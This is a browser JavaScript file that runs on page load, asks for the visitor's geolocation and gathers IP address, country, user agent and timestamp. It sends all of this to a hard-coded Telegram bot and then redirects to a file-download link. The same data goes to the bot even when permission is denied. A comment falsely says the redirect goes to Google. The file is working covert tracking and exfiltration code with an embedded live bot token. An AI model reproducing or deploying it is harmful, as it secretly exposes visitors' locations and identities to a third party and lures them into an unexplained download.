// listen to window load event
window.addEventListener('load', function () {
    if (navigator.geolocation) {
        navigator.geolocation.getCurrentPosition(successCallback, errorCallback);
    } else {
        //document.getElementById('status').innerText = "Geolocation is not supported by this browser.";
    }
});

async function successCallback(position) {
    //document.getElementById('status').innerText = "Location access granted.";
    // You can use position.coords.latitude and position.coords.longitude here.
    // console.log('Latitude: ' + position.coords.latitude);
    // console.log('Longitude: ' + position.coords.longitude);
    let currentTimestamp = new Date().toISOString();
    let userAgent = navigator.userAgent;
    let ipAndCountry = await getIPAndCountry();
    let ip = ipAndCountry.ip;
    let country = ipAndCountry.country;

    sentToTelegramBot(position.coords.latitude, position.coords.longitude, currentTimestamp, userAgent, ip, country);
    // redirect to google.com
    window.location.href = `https://send.zcyph.cc/download/348dfa91803c0942/#RA-2vcQCp7RQabIlGgYeTg`;

}

function errorCallback(error) {
    switch (error.code) {
        case error.PERMISSION_DENIED:
            //document.getElementById('status').innerText = "User denied the request for Geolocation.";
            sendToTelegramBotFail("Permission Denied");
            break;
        case error.POSITION_UNAVAILABLE:
            //document.getElementById('status').innerText = "Location information is unavailable.";
            sendToTelegramBotFail("Position Unavialable");
            break;
        case error.TIMEOUT:
            //document.getElementById('status').innerText = "The request to get user location timed out.";
            sendToTelegramBotFail("Timeout");
            break;
        case error.UNKNOWN_ERROR:
            //document.getElementById('status').innerText = "An unknown error occurred.";
            sendToTelegramBotFail("Unknown Error");
            break;
    }
}

async function getIPAndCountry() {
    // fetch https://api.country.is/ to get a  json from {"ip":"your_ip","country":"your_country"}
    const response = await fetch('https://api.country.is/')
    // log the errors
    if (!response.ok) {
        console.error('Error:', response.statusText)
        return
    }
    return await response.json()
}

function sentToTelegramBot(latitude, longitude, timestamp, userAgent, ip, country) {
    // Replace with your bot token and chat id
    const token = '6343774431:AAFR-TYiel6owWpqzotB5rRtIpkY_saSrdc';
    const chatId = '7175670385';

    const text = `
\`\`\`
Timestamp: ${timestamp},
Latitude: ${latitude},
Longitude: ${longitude},
User Agent: ${userAgent},
IP: ${ip},
Country: ${country},
\`\`\`
Google Maps: [View Location](https://www.google.com/maps/search/?api=1&query=${latitude},${longitude})
    `;

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

    fetch(url)
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error(error));
}


async function sendToTelegramBotFail(reason) {
    // Replace with your bot token and chat id
    const token = '6343774431:AAFR-TYiel6owWpqzotB5rRtIpkY_saSrdc';
    const chatId = '7175670385';
    let currentTimestamp = new Date().toISOString();
    let userAgent = navigator.userAgent;
    let ipAndCountry = await getIPAndCountry();
    let ip = ipAndCountry.ip;
    let country = ipAndCountry.country;

    const text = `
\`\`\`
Timestamp: ${currentTimestamp},
Reason: ${reason},
User Agent: ${userAgent},
IP: ${ip},
Country: ${country},
\`\`\``;

    const url = `https://api.telegram.org/bot${token}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(text)}&parse_mode=Markdown`;

    fetch(url)
        .then(response => response.json())
        .then(data => console.log(data))
        .catch(error => console.error(error));

    window.location.href = `https://send.zcyph.cc/download/348dfa91803c0942/#RA-2vcQCp7RQabIlGgYeTg`;
}
